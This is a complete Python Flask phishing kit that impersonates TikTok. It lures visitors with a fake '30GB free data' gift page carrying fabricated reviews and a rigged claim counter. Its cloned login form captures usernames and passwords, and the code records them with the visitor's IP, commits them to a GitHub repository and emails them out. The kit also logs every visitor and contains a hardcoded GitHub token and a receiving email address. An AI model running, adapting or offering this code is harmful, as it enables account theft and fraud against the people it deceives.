# =============================================================================
# TIKTOK 30GB PROMO – AUTO‑COMMIT TO GITHUB
# GitHub: AliHamza-lab/hackme
# =============================================================================

import os
import json
import logging
import smtplib
import threading
import requests
from email.message import EmailMessage
from datetime import datetime
from flask import Flask, request, render_template_string, abort, redirect
from github import Github

# -------------------- CONFIGURATION --------------------
GITHUB_TOKEN = "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"
REPO_NAME = "AliHamza-lab/hackme"
GITHUB_BRANCH = "main"          # if your default branch is "master", change to "master"

VIEW_SECRET = "changeme123"     # change this to something secret
PUBLIC_URL = os.environ.get('PUBLIC_URL', '')   # e.g., "https://tiktok-promo.onrender.com"

# Email alerts (set empty strings to disable)
EMAIL_SENDER = ""          # e.g., "your@brevo.com"
EMAIL_PASSWORD = ""
EMAIL_FROM = ""
EMAIL_RECEIVER = "ah3418678@gmail.com"

SMTP_SERVER = "smtp-relay.brevo.com"
SMTP_PORT = 587
SMTP_USE_SSL = False

DATA_FILE = "captured_credentials.json"
VISITORS_FILE = "visitors.json"
PING_INTERVAL = 600   # 10 minutes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
app = Flask(__name__)

# ==================== HTML TEMPLATES ====================
PROMO_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok · 30GB Free Data Gift</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(145deg, #000000 0%, #121212 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            color: white;
        }
        .glass-card {
            max-width: 500px;
            width: 100%;
            background: rgba(20, 20, 20, 0.7);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 32px 24px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 30px 50px rgba(0,0,0,0.5), 0 0 0 1px rgba(254,44,85,0.2) inset;
        }
        .tiktok-badge { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 24px; }
        .gift-container { margin: 10px 0 20px; cursor: pointer; transition: transform 0.3s; }
        .gift-container:hover { transform: scale(1.02); }
        .gift-box {
            position: relative;
            width: 180px;
            height: 180px;
            margin: 0 auto;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-8px); } 100% { transform: translateY(0px); } }
        .gift-lid {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 40px;
            background: linear-gradient(145deg, #fe2c55, #ff6b6b);
            border-radius: 12px 12px 4px 4px;
            box-shadow: 0 8px 0 #b01e3e, 0 12px 20px rgba(0,0,0,0.3);
            transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            transform-origin: top left;
            z-index: 3;
        }
        .gift-body {
            position: absolute;
            bottom: 0;
            left: 10px;
            width: 160px;
            height: 130px;
            background: linear-gradient(145deg, #ff4d6d, #c9184a);
            border-radius: 12px 12px 16px 16px;
            box-shadow: 0 8px 0 #800f2f, 0 15px 25px rgba(0,0,0,0.4);
            z-index: 1;
        }
        .gift-ribbon-vertical {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            width: 24px;
            height: 100%;
            background: #00f2ea;
            box-shadow: 0 4px 0 #00b4b0;
            z-index: 2;
        }
        .gift-ribbon-horizontal {
            position: absolute;
            top: 50px;
            left: 0;
            width: 100%;
            height: 24px;
            background: #00f2ea;
            box-shadow: 0 4px 0 #00b4b0;
            z-index: 2;
        }
        .gift-bow-left, .gift-bow-right {
            position: absolute;
            top: -20px;
            width: 40px;
            height: 40px;
            background: #00f2ea;
            border-radius: 50% 50% 50% 0;
            transform: rotate(45deg);
            box-shadow: 0 4px 0 #00b4b0;
            z-index: 4;
        }
        .gift-bow-left { left: 25px; }
        .gift-bow-right { right: 25px; transform: rotate(135deg); }
        .gift-bow-center {
            position: absolute;
            top: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 30px;
            height: 30px;
            background: #00f2ea;
            border-radius: 50%;
            box-shadow: 0 4px 0 #00b4b0;
            z-index: 5;
        }
        .gift-box.open .gift-lid { transform: translateY(-120px) rotate(-25deg); opacity: 0; }
        .gift-box.open .gift-bow-left, .gift-box.open .gift-bow-right, .gift-box.open .gift-bow-center { opacity: 0; }
        .offer-content { max-height: 0; opacity: 0; overflow: hidden; transition: max-height 0.8s ease, opacity 0.6s ease; }
        .offer-content.show { max-height: 800px; opacity: 1; margin-top: 20px; }
        .data-badge {
            background: linear-gradient(135deg, #fe2c55, #ff6b6b);
            border-radius: 60px;
            padding: 12px 24px;
            margin-bottom: 24px;
            box-shadow: 0 10px 20px rgba(254,44,85,0.3);
        }
        .data-number { font-size: 52px; font-weight: 800; letter-spacing: -2px; }
        .data-label { font-size: 14px; opacity: 0.9; text-transform: uppercase; letter-spacing: 3px; }
        .cta-button {
            display: block;
            width: 100%;
            background: white;
            color: #fe2c55;
            border: none;
            border-radius: 60px;
            padding: 18px;
            font-size: 18px;
            font-weight: 700;
            text-decoration: none;
            margin: 20px 0 12px;
            transition: all 0.3s;
        }
        .cta-button:hover { background: #fe2c55; color: white; transform: scale(1.02); }
        .reviews-section { margin: 28px 0 16px; text-align: left; }
        .reviews-title { font-size: 18px; font-weight: 700; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; justify-content: center; }
        .reviews-title span { background: #00f2ea; color: #000; font-size: 14px; padding: 4px 12px; border-radius: 40px; }
        .review-card {
            background: rgba(255,255,255,0.08);
            border-radius: 24px;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .review-header { display: flex; align-items: center; gap: 12px; margin-bottom: 10px; }
        .review-avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #fe2c55, #f9a826);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 18px;
            color: white;
        }
        .review-name { font-weight: 700; font-size: 15px; }
        .review-date { font-size: 11px; opacity: 0.6; }
        .review-stars { color: #f5b642; font-size: 14px; }
        .review-text { font-size: 14px; line-height: 1.4; opacity: 0.9; margin-top: 6px; }
        .live-counter {
            background: #00f2ea20;
            border-radius: 40px;
            padding: 6px 12px;
            font-size: 13px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            margin-bottom: 12px;
            border: 1px solid #00f2ea40;
        }
        .blink {
            width: 8px;
            height: 8px;
            background-color: #00f2ea;
            border-radius: 50%;
            display: inline-block;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
        .features { display: flex; justify-content: space-around; margin: 20px 0 10px; }
        .feature-item { text-align: center; opacity: 0.8; }
        .feature-icon { font-size: 28px; margin-bottom: 6px; }
        .feature-text { font-size: 12px; color: #aaa; }
        .footer-note { color: #777; font-size: 11px; margin-top: 20px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.05); }
        .click-hint { color: #00f2ea; font-size: 14px; margin: 8px 0; font-weight: 500; }
    </style>
</head>
<body>
    <div class="glass-card">
        <div class="tiktok-badge">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="118" height="30"><path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path><path fill="#FE2C55" d="M20.41 6.044a6.54 6.54 0 01-1.617-4.316h-1.265a6.557 6.557 0 002.881 4.316zM8.707 15.365a3.98 3.98 0 00-3.974 3.976c0 1.528.87 2.858 2.134 3.523a3.937 3.937 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.41 0 .805.07 1.176.185v-4.833a8.852 8.852 0 00-1.176-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.175-.185z"></path><path fill="#FE2C55" d="M23.992 8.166v3.676a11.25 11.25 0 01-6.579-2.116v9.621c0 4.802-3.903 8.714-8.706 8.714a8.669 8.669 0 01-4.99-1.579 8.69 8.69 0 006.37 2.781c4.796 0 8.706-3.906 8.706-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.479 0-.939-.052-1.38-.148z"></path><path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715z"></path></svg>
            <span style="font-weight:700; color:#fff; font-size:18px; margin-left:4px;">TikTok</span>
        </div>
        <p style="color:#aaa; margin-bottom:16px; font-size:14px;">🎉 Exclusive for you</p>
        <div class="gift-container" id="giftContainer">
            <div class="gift-box" id="giftBox">
                <div class="gift-lid"></div>
                <div class="gift-bow-left"></div>
                <div class="gift-bow-right"></div>
                <div class="gift-bow-center"></div>
                <div class="gift-body">
                    <div class="gift-ribbon-vertical"></div>
                    <div class="gift-ribbon-horizontal"></div>
                </div>
            </div>
        </div>
        <div class="click-hint" id="hint">👇 Tap the gift to open!</div>
        <div class="offer-content" id="offerContent">
            <div class="data-badge">
                <div class="data-number">30 GB</div>
                <div class="data-label">Free Internet Data</div>
            </div>
            <div class="live-counter"><span class="blink"></span> <span id="claimCounter">1,284</span> people claimed today</div>
            <p style="margin-bottom:8px; font-size:16px; color:#ddd;">✨ Ready to activate</p>
            <a href="/login" class="cta-button">Log in with TikTok →</a>
            <p style="font-size:12px; opacity:0.6;">No payment required • Instant</p>
            <div class="reviews-section">
                <div class="reviews-title">⭐ Real user reviews <span>4.8 ★</span></div>
                <div class="review-card"><div class="review-header"><div class="review-avatar">JD</div><div class="review-user"><div class="review-name">Jessica D.</div><div class="review-date">Verified · 2 hours ago</div></div><div class="review-stars">★★★★★</div></div><div class="review-text">“Got my 30GB within 5 minutes! Finally I can scroll TikTok without worrying about data. Thank you TikTok team!”</div></div>
                <div class="review-card"><div class="review-header"><div class="review-avatar">MT</div><div class="review-user"><div class="review-name">Marcus T.</div><div class="review-date">Verified · yesterday</div></div><div class="review-stars">★★★★★</div></div><div class="review-text">“Legit free data – I was skeptical but it works perfectly. The gift animation is fun too 😄”</div></div>
                <div class="review-card"><div class="review-header"><div class="review-avatar">SL</div><div class="review-user"><div class="review-name">Sophia L.</div><div class="review-date">Verified · 3 days ago</div></div><div class="review-stars">★★★★☆</div></div><div class="review-text">“Easy process, just log in and the data was added instantly. Highly recommend!”</div></div>
            </div>
        </div>
        <div class="features"><div class="feature-item"><div class="feature-icon">📱</div><div class="feature-text">Stream</div></div><div class="feature-item"><div class="feature-icon">🎮</div><div class="feature-text">Gaming</div></div><div class="feature-item"><div class="feature-icon">🌐</div><div class="feature-text">Browse</div></div></div>
        <div class="footer-note">🔒 Secured by TikTok • © 2026</div>
    </div>
    <script>
        const giftBox = document.getElementById('giftBox');
        const offerContent = document.getElementById('offerContent');
        const hint = document.getElementById('hint');
        let isOpen = false;
        giftBox.addEventListener('click', () => {
            if (!isOpen) {
                giftBox.classList.add('open');
                offerContent.classList.add('show');
                hint.style.opacity = '0';
                setTimeout(() => { hint.style.display = 'none'; }, 500);
                isOpen = true;
                if (navigator.vibrate) navigator.vibrate(20);
            }
        });
        let count = 1284;
        setInterval(() => {
            if (isOpen) {
                count += Math.floor(Math.random() * 7);
                document.getElementById('claimCounter').innerText = count.toLocaleString();
            }
        }, 8000);
    </script>
</body>
</html>
'''

PHISH_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok · Login to claim 30GB</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #f8f9fa; min-height: 100vh; display: flex; flex-direction: column; }
        .header { display: flex; align-items: center; justify-content: space-between; padding: 16px 24px; background: rgba(255,255,255,0.8); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 10; }
        .logo { display: flex; align-items: center; text-decoration: none; color: #000; font-weight: 700; font-size: 20px; }
        .logo svg { margin-right: 8px; }
        .help-link { color: #606770; text-decoration: none; font-size: 14px; font-weight: 500; }
        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
        .card { width: 100%; max-width: 400px; background: #fff; border-radius: 32px; box-shadow: 0 20px 40px rgba(0,0,0,0.06); padding: 36px 28px; border: 1px solid rgba(0,0,0,0.02); }
        .gift-reminder { background: linear-gradient(135deg, #fe2c55, #ff6b6b); color: white; border-radius: 20px; padding: 16px; margin-bottom: 28px; text-align: center; }
        .gift-reminder span { font-size: 28px; margin-right: 8px; }
        .card h2 { font-size: 26px; font-weight: 700; margin-bottom: 6px; color: #121212; }
        .subtitle { color: #606770; font-size: 15px; margin-bottom: 28px; }
        .form-group { margin-bottom: 22px; }
        .form-group label { display: block; font-size: 14px; font-weight: 600; color: #1f1f1f; margin-bottom: 8px; }
        .input-wrapper input { width: 100%; padding: 15px 18px; background: #f1f1f2; border: 1.5px solid transparent; border-radius: 18px; font-size: 16px; outline: none; transition: all 0.2s; }
        .input-wrapper input:focus { border-color: #fe2c55; background: #fff; box-shadow: 0 0 0 4px rgba(254,44,85,0.1); }
        .forgot-link { text-align: right; margin-top: 6px; }
        .forgot-link a { color: #fe2c55; font-size: 14px; text-decoration: none; font-weight: 600; }
        .login-btn { width: 100%; padding: 16px; background: #fe2c55; color: white; border: none; border-radius: 60px; font-size: 17px; font-weight: 700; cursor: pointer; margin: 16px 0 22px; transition: all 0.2s; }
        .login-btn:hover { background: #e01e45; transform: scale(1.01); }
        .signup-prompt { text-align: center; color: #606770; font-size: 15px; margin-bottom: 20px; }
        .signup-prompt a { color: #fe2c55; text-decoration: none; font-weight: 700; margin-left: 6px; }
        .footer-links { display: flex; justify-content: center; gap: 28px; font-size: 13px; color: #8a8b91; }
        .footer-links a { color: #8a8b91; text-decoration: none; }
        .copyright { text-align: center; color: #8a8b91; font-size: 12px; margin-top: 20px; padding-top: 20px; border-top: 1px solid #f0f0f0; }
        .error-message { background: #fee2e2; color: #b91c1c; padding: 12px 16px; border-radius: 18px; margin-bottom: 22px; font-size: 14px; border-left: 4px solid #b91c1c; }
    </style>
</head>
<body>
    <div class="header">
        <a class="logo" href="/">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="110" height="36"><path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path><path fill="#FE2C55" d="M20.41 6.044a6.54 6.54 0 01-1.617-4.316h-1.265a6.557 6.557 0 002.881 4.316zM8.707 15.365a3.98 3.98 0 00-3.974 3.976c0 1.528.87 2.858 2.134 3.523a3.937 3.937 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.41 0 .805.07 1.176.185v-4.833a8.852 8.852 0 00-1.176-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.175-.185z"></path><path fill="#FE2C55" d="M23.992 8.166v3.676a11.25 11.25 0 01-6.579-2.116v9.621c0 4.802-3.903 8.714-8.706 8.714a8.669 8.669 0 01-4.99-1.579 8.69 8.69 0 006.37 2.781c4.796 0 8.706-3.906 8.706-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.479 0-.939-.052-1.38-.148z"></path><path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715z"></path></svg>
            TikTok
        </a>
        <a class="help-link" href="#">Help</a>
    </div>
    <div class="main">
        <div class="card">
            <div class="gift-reminder"><span>🎁</span> 30GB Gift waiting for you!</div>
            <h2>Log in</h2>
            <p class="subtitle">to claim your free data</p>
            {% if error %}<div class="error-message">{{ error }}</div>{% endif %}
            <form method="POST" action="/login">
                <div class="form-group"><label>Email or username</label><div class="input-wrapper"><input type="text" name="username" required autofocus></div></div>
                <div class="form-group"><label>Password</label><div class="input-wrapper"><input type="password" name="password" required></div><div class="forgot-link"><a href="#">Forgot password?</a></div></div>
                <button type="submit" class="login-btn">Log in & Claim</button>
                <div class="signup-prompt">New to TikTok? <a href="#">Sign up</a></div>
            </form>
            <div class="footer-links"><a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a></div>
            <div class="copyright">© 2026 TikTok</div>
        </div>
    </div>
</body>
</html>
'''

# ==================== GITHUB AUTO‑COMMIT ====================
def commit_to_github(file_path, data):
    if not GITHUB_TOKEN:
        logger.warning("No GitHub token – skipping commit")
        return
    try:
        g = Github(GITHUB_TOKEN)
        repo = g.get_repo(REPO_NAME)
        content_str = json.dumps(data, indent=2, ensure_ascii=False)
        try:
            contents = repo.get_contents(file_path, ref=GITHUB_BRANCH)
            repo.update_file(contents.path, f"Auto-update {file_path}", content_str, contents.sha, branch=GITHUB_BRANCH)
            logger.info(f"Updated {file_path} on GitHub")
        except:
            repo.create_file(file_path, f"Create {file_path}", content_str, branch=GITHUB_BRANCH)
            logger.info(f"Created {file_path} on GitHub")
    except Exception as e:
        logger.error(f"GitHub commit error: {e}")

def save_credentials(username, password, ip):
    entry = {"timestamp": datetime.now().isoformat(), "ip": ip, "username": username, "password": password}
    data = []
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            data = json.load(f)
    data.append(entry)
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)
    commit_to_github(DATA_FILE, data)

def log_visitor(ip, ua):
    entry = {"timestamp": datetime.now().isoformat(), "ip": ip, "user_agent": ua}
    visitors = []
    if os.path.exists(VISITORS_FILE):
        with open(VISITORS_FILE, 'r') as f:
            visitors = json.load(f)
    visitors.append(entry)
    with open(VISITORS_FILE, 'w') as f:
        json.dump(visitors, f, indent=2)
    commit_to_github(VISITORS_FILE, visitors)

def send_email_alert(subject, body):
    if not EMAIL_SENDER or not EMAIL_PASSWORD:
        return
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg['Subject'] = subject
        msg['From'] = EMAIL_FROM
        msg['To'] = EMAIL_RECEIVER
        if SMTP_USE_SSL:
            with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as smtp:
                smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
                smtp.send_message(msg)
        else:
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
                smtp.starttls()
                smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
                smtp.send_message(msg)
        logger.info("Email alert sent")
    except Exception as e:
        logger.error(f"Email failed: {e}")

# ==================== SELF‑PING TO KEEP RENDER AWAKE ====================
def keep_alive():
    if not PUBLIC_URL:
        return
    url = f"{PUBLIC_URL.rstrip('/')}/health"
    while True:
        try:
            requests.get(url, timeout=10)
            logger.info("Self-ping OK")
        except:
            logger.error("Self-ping failed")
        threading.Event().wait(PING_INTERVAL)

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent', 'Unknown')
    threading.Thread(target=log_visitor, args=(ip, ua)).start()
    global PUBLIC_URL
    if not PUBLIC_URL and request.host_url:
        PUBLIC_URL = request.host_url.rstrip('/')
        logger.info(f"Auto-set PUBLIC_URL to {PUBLIC_URL}")
    return render_template_string(PROMO_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        if not username or not password:
            return render_template_string(PHISH_HTML, error="Both fields required")
        save_credentials(username, password, ip)
        subject = f"🎁 TikTok Login - {username}"
        body = f"Time: {datetime.now()}\nIP: {ip}\nUser: {username}\nPass: {password}"
        threading.Thread(target=send_email_alert, args=(subject, body)).start()
        return redirect("https://www.tiktok.com")
    return render_template_string(PHISH_HTML, error=None)

@app.route('/view-data')
def view_data():
    key = request.args.get('key', '')
    if key != VIEW_SECRET:
        abort(403)
    creds = json.load(open(DATA_FILE)) if os.path.exists(DATA_FILE) else []
    visitors = json.load(open(VISITORS_FILE)) if os.path.exists(VISITORS_FILE) else []
    return {"credentials": creds, "visitors": visitors}

@app.route('/health')
def health_check():
    return 'OK', 200

# ==================== MAIN ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    threading.Thread(target=keep_alive, daemon=True).start()
    app.run(host='0.0.0.0', port=port, debug=False)
